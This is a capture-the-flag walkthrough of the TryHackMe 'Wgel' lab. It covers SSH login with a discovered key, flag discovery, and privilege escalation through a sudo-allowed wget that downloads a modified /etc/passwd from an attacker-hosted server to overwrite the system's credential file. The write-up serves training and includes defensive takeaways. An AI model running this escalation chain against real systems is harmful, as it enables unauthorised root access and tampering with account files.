
# Wgel CTF — TryHackMe

**By Stager** | FashilHack

---
## What is this machine
Wgel is a beginner-friendly Linux machine that focuses on:
- SSH key-based access
- File discovery
- Privilege escalation via misconfigured sudo permissions

The goal is to move from initial access to root by abusing **insecure system configurations**.

---
## Target

```
IP: 10.10.10.237
OS: Linux (Ubuntu)
Hostname: CorpOne
```

---

## Step 1 — Initial Access (SSH Key)

During enumeration, an SSH private key (`id_rsa`) is discovered.
⚠️ Important step before using it:

```bash
chmod 600 id_rsa.txt
```

Without proper permissions, SSH will  (reject) the key.

---
### Login via SSH:

```bash
ssh -i id_rsa.txt jessie@10.10.10.237
```
### Result:

```bash
whoami
# jessie
```
We now have **user-level access** 🎯

---

## Step 2 — User Flag

Search for flags:

```bash
find / -name "*flag*" 2>/dev/null
```

### Result:

```
/home/jessie/Documents/user_flag.txt
```

Read it:

```bash
cat /home/jessie/Documents/user_flag.txt
```

✔ User flag captured

---

## Step 3 — Privilege Escalation Enumeration

Check sudo permissions:
```bash
sudo -l
```
### Finding:
User can run:
```
wget as root
```

⚠️ This is dangerous — it allows overwriting system files.

---
## Step 4 — Exploiting sudo wget

Goal: overwrite `/etc/passwd` with a modified version.

---
### Step 4.1 — Create Password Hash (Attacker Machine)

Use Python + bcrypt:
```python
import bcrypt

password = "password".encode('utf-8')
hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())

print(hashed_password.decode('utf-8'))
```
This generates a **valid password hash**.

---
### Step 4.2 — Modify /etc/passwd
Copy original `/etc/passwd` and modify the root entry:
Original:

```
root:x:0:0:root:/root:/bin/bash
```

Replace `x` with your generated hash:

```
root:<HASH>:0:0:root:/root:/bin/bash
```

Save file as:
```
passwd
```

---

### Step 4.3 — Host the File

```bash
python3 -m http.server 8000
```

---

### Step 4.4 — Transfer & Overwrite (Victim Machine)

Backup first (optional but smart):

```bash
cp /etc/passwd /dev/shm/passwd.bak
```

Now overwrite:

```bash
sudo wget http://<ATTACKER-IP>:8000/passwd -O /etc/passwd
```

👉 `-O` writes output directly to `/etc/passwd`

---
## Step 5 — Root Access
Now switch user:

```bash
su root
```
Password:
```
password
```
### Result:

```bash
whoami
# root
```
🔥 Root access achieved

---
## Root Flag

```bash
cat /root/root_flag.txt
```

✔ Root flag captured

---

## Full Attack Chain

```
SSH key found → login as jessie
  ↓
Find user flag
  ↓
sudo -l → wget allowed
  ↓
Create password hash
  ↓
Overwrite /etc/passwd
  ↓
su root → root access
```

---

## Key Takeaways

**1. SSH keys = instant access if exposed**  
Always protect private keys with correct permissions.

---

**2. Misconfigured sudo is critical**  
Allowing `wget` as root = ability to overwrite system files.

---

**3. /etc/passwd is a high-value target**  
If writable → full system compromise.

---

**4. Always think “what can I overwrite?”**  
Privilege escalation is often about file control, not exploits.

---

_Stager —  FashilHack — Simulating Attacks, Securing Businesses._